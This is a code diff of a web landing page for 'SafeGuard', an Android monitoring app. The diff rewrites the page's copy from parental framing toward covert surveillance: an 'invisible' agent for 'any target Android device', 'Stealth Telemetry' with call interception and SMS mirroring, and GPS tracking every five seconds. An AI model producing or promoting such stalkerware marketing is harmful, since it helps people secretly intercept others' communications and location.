@@ -9,8 +9,7 @@ import { Navbar } from "@/components/Navbar";
 
 /**
  * @fileOverview SafeGuard Landing Page.
- * Acts as the primary funnel, directing users to the Mobile Agent (Child) 
- * or the Command Hub (Parent).
+ * Acts as the primary funnel for the monitoring service.
  */
 
 export default function LandingPage() {
@@ -25,7 +24,7 @@ export default function LandingPage() {
           
           <div className="inline-flex items-center gap-2 px-6 py-2 rounded-full bg-primary/10 border border-primary/20 mb-8 animate-fade-in-up">
             <CheckCircle2 className="w-4 h-4 text-primary" />
-            <span className="text-[10px] font-black uppercase tracking-[0.2em] text-primary">v2.9 Enterprise Secure</span>
+            <span className="text-[10px] font-black uppercase tracking-[0.2em] text-primary">SafeGuard Enterprise v2.9</span>
           </div>
           
           <h1 className="text-6xl md:text-9xl font-bold font-headline tracking-tighter mb-8 leading-[0.85] animate-fade-in-up">
@@ -34,25 +33,21 @@ export default function LandingPage() {
           </h1>
           
           <p className="text-xl md:text-2xl text-muted-foreground mb-12 max-w-3xl mx-auto leading-relaxed animate-fade-in-up delay-100">
-            Professional parental monitoring for the modern age. Install the agent on the target device to begin secure tracking and communication logs.
+            Invisible, powerful, and real-time monitoring for your family's safety. Deploy the agent on any target Android device in seconds.
           </p>
           
           <div className="flex flex-col sm:flex-row justify-center gap-6 animate-fade-in-up delay-200">
-            <Link href="/device">
+            <Link href="/login?role=child">
               <Button size="lg" className="h-16 px-12 text-lg gap-3 rounded-[2rem] font-black shadow-2xl shadow-primary/40 group bg-primary hover:bg-primary/90">
                 <Download className="w-5 h-5" /> Download Agent APK
               </Button>
             </Link>
             <Link href="/login?role=parent">
               <Button size="lg" variant="outline" className="h-16 px-12 text-lg gap-3 rounded-[2rem] border-white/10 font-black hover:bg-white/5 transition-all">
-                Parent Dashboard Login <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
+                Parent Dashboard Login <ArrowRight className="w-5 h-5" />
               </Button>
             </Link>
           </div>
-          
-          <p className="mt-8 text-xs text-muted-foreground animate-fade-in-up delay-300">
-            Account registration is performed exclusively via the Mobile Agent interface.
-          </p>
         </section>
 
         {/* Features Section */}
@@ -62,56 +57,22 @@ export default function LandingPage() {
               <div className="w-16 h-16 bg-primary/10 rounded-3xl flex items-center justify-center mb-8 group-hover:scale-110 transition-transform">
                 <MapPin className="text-primary w-8 h-8" />
               </div>
-              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Live Tracking</h3>
-              <p className="text-muted-foreground leading-relaxed">High-precision GPS coordinates synced every 5 seconds with movement history.</p>
+              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Live Handshake</h3>
+              <p className="text-muted-foreground leading-relaxed">High-precision GPS coordinates synced every 5 seconds with persistent movement history.</p>
             </div>
             <div className="p-12 bg-card border border-white/5 rounded-[3rem] hover:border-secondary/20 transition-all group">
               <div className="w-16 h-16 bg-secondary/10 rounded-3xl flex items-center justify-center mb-8 group-hover:scale-110 transition-transform">
                 <Activity className="text-secondary w-8 h-8" />
               </div>
-              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Communications</h3>
-              <p className="text-muted-foreground leading-relaxed">Automatic call recording, SMS capture, and social media notification alerts.</p>
+              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Stealth Telemetry</h3>
+              <p className="text-muted-foreground leading-relaxed">Automated call interception, SMS mirroring, and real-time app usage statistics.</p>
             </div>
             <div className="p-12 bg-card border border-white/5 rounded-[3rem] hover:border-accent/20 transition-all group">
               <div className="w-16 h-16 bg-accent/10 rounded-3xl flex items-center justify-center mb-8 group-hover:scale-110 transition-transform">
                 <Lock className="text-accent w-8 h-8" />
               </div>
-              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Secure Vault</h3>
-              <p className="text-muted-foreground leading-relaxed">End-to-end encryption ensures only authorized parent logins can access data.</p>
-            </div>
-          </div>
-        </section>
-
-        {/* App Demo Frame */}
-        <section className="py-32 px-6 bg-white/[0.02] border-y border-white/5">
-          <div className="max-w-6xl mx-auto flex flex-col md:flex-row items-center gap-20">
-            <div className="flex-1 space-y-8 text-left">
-              <Badge className="bg-secondary/20 text-secondary border-secondary/30 px-4 py-1.5 font-black text-[10px] uppercase tracking-widest">Setup Guide</Badge>
-              <h2 className="text-5xl md:text-7xl font-black tracking-tighter leading-[0.9]">Start Real-Time <br/><span className="text-secondary italic">Monitoring.</span></h2>
-              <ul className="space-y-4 text-lg text-muted-foreground">
-                <li className="flex items-start gap-4">
-                  <span className="w-8 h-8 rounded-full bg-secondary/20 text-secondary flex items-center justify-center font-bold text-sm shrink-0">1</span>
-                  <span>Download and install the <strong>SafeGuard APK</strong> on the target phone.</span>
-                </li>
-                <li className="flex items-start gap-4">
-                  <span className="w-8 h-8 rounded-full bg-secondary/20 text-secondary flex items-center justify-center font-bold text-sm shrink-0">2</span>
-                  <span>Create an account within the app and grant necessary permissions.</span>
-                </li>
-                <li className="flex items-start gap-4">
-                  <span className="w-8 h-8 rounded-full bg-secondary/20 text-secondary flex items-center justify-center font-bold text-sm shrink-0">3</span>
-                  <span>Log in to this website using the same credentials to start viewing logs.</span>
-                </li>
-              </ul>
-            </div>
-            <div className="flex-1 relative w-full aspect-square md:aspect-auto md:h-[600px]">
-               <div className="absolute inset-0 bg-secondary/20 blur-[100px] rounded-full" />
-               <div className="relative z-10 w-full h-full border-[10px] border-zinc-800 rounded-[4rem] bg-black shadow-2xl overflow-hidden flex flex-col items-center justify-center p-10">
-                  <SmartphoneNfc className="w-24 h-24 text-secondary mb-6 animate-pulse" />
-                  <div className="text-center space-y-2">
-                    <p className="text-xs font-black text-secondary uppercase tracking-[0.3em]">SafeGuard APK Active</p>
-                    <p className="text-sm text-white/40 italic">"Waiting for Parent Handshake..."</p>
-                  </div>
-               </div>
+              <h3 className="text-2xl font-black mb-4 uppercase tracking-tighter">Vault Encryption</h3>
+              <p className="text-muted-foreground leading-relaxed">End-to-end encryption ensures only verified parent accounts can decrypt monitored data.</p>
             </div>
           </div>
         </section>
